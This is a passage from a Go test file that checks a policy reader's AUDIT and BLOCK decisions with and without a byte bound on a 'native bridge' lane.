		t.Errorf("server lane: %s %v, bound note %v, bound %d; want AUDIT with the note", res.Decision, err, bounded, l.NativeBridgeBytes)
	}

	l.NativeBridgeBytes = 0
	if res, err := l.Read(text); err != nil || res.Decision != policy.DecisionBlock {
		t.Errorf("unbounded lane: %s %v; want the last line's BLOCK", res.Decision, err)
	}
}
